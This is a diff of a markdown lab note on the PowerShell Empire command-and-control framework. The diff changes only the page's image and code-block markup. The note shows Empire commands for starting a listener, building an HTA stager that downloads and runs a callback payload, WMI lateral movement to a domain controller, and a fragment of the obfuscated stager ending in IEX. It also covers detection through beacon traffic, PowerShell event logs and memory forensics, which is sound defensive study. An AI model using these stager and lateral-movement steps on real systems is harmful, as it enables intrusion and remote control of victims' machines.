@@ -6,16 +6,15 @@ description: Exploring key concepts of the Powershell Empire
 
 ## Listener
 
-{% code title="attacker@local" %}
 ```csharp
+// attacker@local
 // Empire commands used
 ?
 uselistener meterpreter
 info
 ```
-{% endcode %}
 
-![](../../.gitbook/assets/empire-listener.png)
+![[empire-listener.png]]
 
 Starting the listener:
 
@@ -23,14 +22,14 @@ Starting the listener:
 execute
 ```
 
-![](../../.gitbook/assets/empire-startlistener.png)
+![[empire-startlistener.png]]
 
 ## Stager
 
 Stager will download and execute the final payload which will call back to the listener we set up previously - `meterpreter`- below shows how to set it up:
 
-{% code title="attacker@local" %}
 ```csharp
+// attacker@local
 //specify what stager to use
 usestager windows/hta
 
@@ -43,33 +42,32 @@ set OutFile stage.hta
 //create the stager
 execute
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/empire-stager (1).png>)
+![[empire-stager (1).png]]
 
 A quick look at the stager code:
 
-![](../../.gitbook/assets/stager-hta.gif)
+![[stager-hta.gif]]
 
 ### Issues
 
 Various stagers I generated for the meterpreter listener were giving me errors like [this](https://github.com/EmpireProject/Empire/issues/896) and this:
 
-![](../../.gitbook/assets/stager-bat.png)
+![[stager-bat.png]]
 
 and this:
 
-![](../../.gitbook/assets/stager-vbs.png)
+![[stager-vbs.png]]
 
 After looking at the traffic and a quick nmap scan, it seemed like there may be a bug in Empire's uselistener module when used with meterpreter - for some reason it will not actually start listening/open up the port:
 
-![](../../.gitbook/assets/stager-listeners.png)
+![[stager-listeners.png]]
 
-![](../../.gitbook/assets/stager-pcap.png)
+![[stager-pcap.png]]
 
 To test this assumption, I created another http listener on port 80 - which worked immediately, leaving the meterpeter listener being buggy at least in my environment:
 
-![](../../.gitbook/assets/stager-http.png)
+![[stager-http.png]]
 
 ## Agent
 
@@ -77,12 +75,12 @@ Agent is essentially a compromised victim system that called back to the listene
 
 Continuing testing with the `http` listener and a `multi/launcher` stager, the agent is finally returned once the `launcher.ps1` (read: stager) is executed on the victim system:
 
-![](../../.gitbook/assets/stager-received.gif)
+![[stager-received.gif]]
 
 Let's try getting one more agent back from another machine via [WMI lateral movement](../lateral-movement/t1047-wmi-for-lateral-movement.md):
 
-{% code title="attacker@local" %}
 ```csharp
+// attacker@local
 interact <agent-name>
 usemodule powershell/lateral_movement/invoke_wmi
 set Agent <agent-name>
@@ -91,25 +89,24 @@ set Password 123456
 set ComputerName dc-mantvydas
 run
 ```
-{% endcode %}
 
-![](../../.gitbook/assets/empire-lateral-wmi.gif)
+![[empire-lateral-wmi.gif]]
 
 ## Beaconing
 
 With default http listener profile set, below are the most commonly used URLs of the agent beaconing back to the listener:
 
-![](../../.gitbook/assets/agent-beaconing.png)
+![[agent-beaconing.png]]
 
 The packet data in any of those beacons:
 
-![](../../.gitbook/assets/agent-beacon-request-response.png)
+![[agent-beacon-request-response.png]]
 
 ## Observations
 
 Note how executing the stager launcher.ps1 spawned another powershell instance and both parent and the child windows are hidden. Note that the children powershell was invoked with an encoded powershell command line:
 
-![](../../.gitbook/assets/agent-procmon.png)
+![[agent-procmon.png]]
 
 Stager's command line in base64:
 
@@ -175,19 +172,19 @@ $DaTA = $DatA[4..$DatA.LeNgTH]; - jOiN[ChaR[]]( & $R $datA($IV + $K)) | IEX
 
 If we isolate the evil powershell that was infected by the Empire in our SIEM, we can see the beacons:
 
-![](../../.gitbook/assets/agent-beacons-logs.png)
+![[agent-beacons-logs.png]]
 
 A compromised system can generate event `800` showing the following in Windows PowerShell logs (powershell 5.0+):
 
-![](../../.gitbook/assets/empire-800.png)
+![[empire-800.png]]
 
 Also loads of `4103` events in `Microsoft-Windows-PowerShell/Operational`:
 
-![](../../.gitbook/assets/empire-4103.png)
+![[empire-4103.png]]
 
 In the same way, if PS transcript logging is enabled, the stager execution could be captured in there:
 
-![](../../.gitbook/assets/empire-transcript.png)
+![[empire-transcript.png]]
 
 ### Memory Dumps
 
@@ -197,19 +194,19 @@ A memory dump can also reveal the same stager activity:
 volatility -f /mnt/memdumps/w7-empire.bin consoles --profile Win7SP1x64
 ```
 
-![](../../.gitbook/assets/empire-volatility.png)
+![[empire-volatility.png]]
 
 ## References
 
-{% embed url="http://www.harmj0y.net/blog/empire/expanding-your-empire/" %}
+[www.harmj0y.net/blog/empire/expanding-your-empire](http://www.harmj0y.net/blog/empire/expanding-your-empire/)
 
-{% embed url="http://www.harmj0y.net/blog/empire/nothing-lasts-forever-persistence-with-empire/" %}
+[www.harmj0y.net/blog/empire/nothing-lasts-forever-persistence-with-empire](http://www.harmj0y.net/blog/empire/nothing-lasts-forever-persistence-with-empire/)
 
-{% embed url="https://null-byte.wonderhowto.com/how-to/use-powershell-empire-getting-started-with-post-exploitation-windows-hosts-0178664/" %}
+[null-byte.wonderhowto.com/how-to/use-powershell-empire-getting-started-with-post-exploitation-windows-hosts-0178664](https://null-byte.wonderhowto.com/how-to/use-powershell-empire-getting-started-with-post-exploitation-windows-hosts-0178664/)
 
-{% embed url="https://ethicalhackingblog.com/hacking-powershell-empire-2-0/" %}
+[ethicalhackingblog.com/hacking-powershell-empire-2-0](https://ethicalhackingblog.com/hacking-powershell-empire-2-0/)
 
-{% embed url="http://www.sixdub.net/?p=627" %}
+[www.sixdub.net/?p=627](http://www.sixdub.net/?p=627)
 
 [https://www.sans.org/reading-room/whitepapers/incident/disrupting-empire-identifying-powershell-empire-command-control-activity-38315](https://www.sans.org/reading-room/whitepapers/incident/disrupting-empire-identifying-powershell-empire-command-control-activity-38315)
 
